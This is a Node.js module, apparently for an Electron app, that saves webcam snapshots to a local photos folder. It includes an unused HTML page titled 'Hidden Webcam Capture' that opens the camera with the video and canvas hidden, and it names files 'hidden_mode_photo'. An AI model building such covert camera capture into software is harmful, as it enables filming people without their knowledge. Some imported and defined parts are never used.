const puppeteer = require('puppeteer');
const fs = require('fs').promises;
const path = require('path');
const os = require('os');

// Function to get the photos directory path
function getPhotosDir() {
    return path.join(__dirname, 'photos');
}

// Function to create photos directory if it doesn't exist
async function ensurePhotosDir() {
    const photosDir = getPhotosDir();
    try {
        await fs.access(photosDir);
    } catch (error) {
        // Directory doesn't exist, create it
        await fs.mkdir(photosDir, { recursive: true });
        console.log('Photos directory created:', photosDir);
    }
    return photosDir;
}

// Function to generate a unique filename with timestamp
function generateFilename(isHiddenMode = false) {
    const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
    return isHiddenMode ? `hidden_mode_photo_${timestamp}.jpg` : `photo_${timestamp}.jpg`;
}

// Create a hidden HTML page that captures from webcam
const hiddenCaptureHTML = `
<!DOCTYPE html>
<html>
<head>
    <title>Hidden Webcam Capture</title>
    <style>
        body { margin: 0; padding: 0; overflow: hidden; background: black; }
        video { display: none; }
        canvas { display: none; }
    </style>
</head>
<body>
    <video id="video" autoplay playsinline muted></video>
    <canvas id="canvas"></canvas>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');
        let stream = null;

        async function initCamera() {
            try {
                // Request access to the camera
                stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        width: { ideal: 1280 },
                        height: { ideal: 720 },
                        facingMode: 'user'
                    },
                    audio: false
                });

                video.srcObject = stream;
                console.log('Camera initialized');

                // Wait for video to be ready
                video.onloadedmetadata = () => {
                    console.log('Video metadata loaded');
                };
            } catch (err) {
                console.error('Error accessing camera:', err);
                // Send error message to Node.js process
                if (window.nodeCallback) {
                    window.nodeCallback('error', err.message);
                }
            }
        }

        async function capturePhoto() {
            if (video.readyState === 4) { // HAVE_ENOUGH_DATA
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;

                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                const imageData = canvas.toDataURL('image/jpeg', 0.9);

                // Send image data back to Node.js process
                if (window.nodeCallback) {
                    window.nodeCallback('photo', imageData);
                }

                return imageData;
            } else {
                console.log('Video not ready for capture');
                if (window.nodeCallback) {
                    window.nodeCallback('error', 'Video not ready for capture');
                }
                return null;
            }
        }

        // Initialize camera when page loads
        initCamera();

        // Make functions available globally for Node.js to call
        window.capturePhoto = capturePhoto;
    </script>
</body>
</html>
`;

// Alternative approach: Create a function that can be called from the renderer process
// This approach allows capturing from the existing Electron app's renderer process
// which already has webcam access

// Function to save image data to file (to be used from renderer process via IPC)
async function saveImageToFile(imageData, isHiddenMode = false) {
    try {
        // Ensure photos directory exists
        await ensurePhotosDir();

        // Convert data URL to buffer
        const base64Data = imageData.replace(/^data:image\/jpeg;base64,/, '');
        const buffer = Buffer.from(base64Data, 'base64');

        // Create filename with timestamp
        const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
        const filename = isHiddenMode ? `hidden_mode_photo_${timestamp}.jpg` : `photo_${timestamp}.jpg`;
        const filepath = path.join(getPhotosDir(), filename);

        // Save the image to the photos directory
        await fs.writeFile(filepath, buffer);
        console.log('Photo saved successfully:', filepath);

        return filepath;
    } catch (error) {
        console.error('Error saving image to file:', error);
        throw error;
    }
}

// For the standalone script execution, provide a message
if (require.main === module) {
    console.log('This module is designed to be used from the Electron app renderer process.');
    console.log('For standalone capture, please use the Electron app with hidden mode enabled.');
}

// Export functions for use in other modules
module.exports = {
    saveImageToFile,
    ensurePhotosDir,
    getPhotosDir
};